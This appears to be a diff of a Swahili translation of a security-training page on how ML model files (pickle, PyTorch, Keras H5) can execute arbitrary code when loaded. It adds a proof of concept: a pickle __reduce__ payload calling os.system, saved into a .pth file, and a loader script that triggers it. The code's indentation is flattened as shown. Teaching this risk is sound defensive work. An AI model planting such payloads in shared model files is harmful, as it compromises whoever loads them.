@@ -4,7 +4,7 @@
 
 ## Loading models to RCE
 
-Modeli za Machine Learning kawaida hushirikiwa katika mifumo tofauti, kama ONNX, TensorFlow, PyTorch, n.k. Hizi modeli zinaweza kupakuliwa kwenye mashine za waendelezaji au mifumo ya uzalishaji ili kuzitumia. Kawaida, modeli hazipaswi kuwa na msimbo mbaya, lakini kuna baadhi ya kesi ambapo modeli inaweza kutumika kutekeleza msimbo wa kiholela kwenye mfumo kama kipengele kilichokusudiwa au kwa sababu ya udhaifu katika maktaba ya kupakia modeli.
+Machine Learning models mara nyingi hushirikiwa katika mifumo tofauti, kama ONNX, TensorFlow, PyTorch, n.k. Mifano hii inaweza kupakuliwa kwenye mashine za waendelezaji au mifumo ya uzalishaji ili kuitumia. Kawaida mifano haipaswi kuwa na msimbo mbaya, lakini kuna baadhi ya kesi ambapo mfano unaweza kutumika kutekeleza msimbo wa kiholela kwenye mfumo kama kipengele kilichokusudiwa au kwa sababu ya udhaifu katika maktaba ya kupakia mfano.
 
 Wakati wa kuandika, haya ni baadhi ya mifano ya aina hii ya udhaifu:
 
@@ -23,6 +23,43 @@ Wakati wa kuandika, haya ni baadhi ya mifano ya aina hii ya udhaifu:
 | **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
 | **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
 
-Zaidi ya hayo, kuna baadhi ya modeli zinazotegemea python pickle kama zile zinazotumiwa na [PyTorch](https://github.com/pytorch/pytorch/security) ambazo zinaweza kutumika kutekeleza msimbo wa kiholela kwenye mfumo ikiwa hazijapakiwa na `weights_only=True`. Hivyo, modeli yoyote inayotegemea pickle inaweza kuwa na hatari maalum kwa aina hii ya mashambulizi, hata kama hazijatajwa katika jedwali hapo juu.
+Zaidi ya hayo, kuna mifano kadhaa ya python pickle kama zile zinazotumiwa na [PyTorch](https://github.com/pytorch/pytorch/security) ambazo zinaweza kutumika kutekeleza msimbo wa kiholela kwenye mfumo ikiwa hazijapakiwa na `weights_only=True`. Hivyo, mfano wowote wa pickle unaweza kuwa na hatari maalum kwa aina hii ya mashambulizi, hata kama haujatajwa kwenye jedwali hapo juu.
 
+Mfano:
+
+- Create the model:
+```python
+# attacker_payload.py
+import torch
+import os
+
+class MaliciousPayload:
+def __reduce__(self):
+# This code will be executed when unpickled (e.g., on model.load_state_dict)
+return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))
+
+# Create a fake model state dict with malicious content
+malicious_state = {"fc.weight": MaliciousPayload()}
+
+# Save the malicious state dict
+torch.save(malicious_state, "malicious_state.pth")
+```
+- Pakia mfano:
+```python
+# victim_load.py
+import torch
+import torch.nn as nn
+
+class MyModel(nn.Module):
+def __init__(self):
+super().__init__()
+self.fc = nn.Linear(10, 1)
+
+model = MyModel()
+
+# ⚠️ This will trigger code execution from pickle inside the .pth file
+model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))
+
+# /tmp/pwned.txt is created even if you get an error
+```
 {{#include ../banners/hacktricks-training.md}}
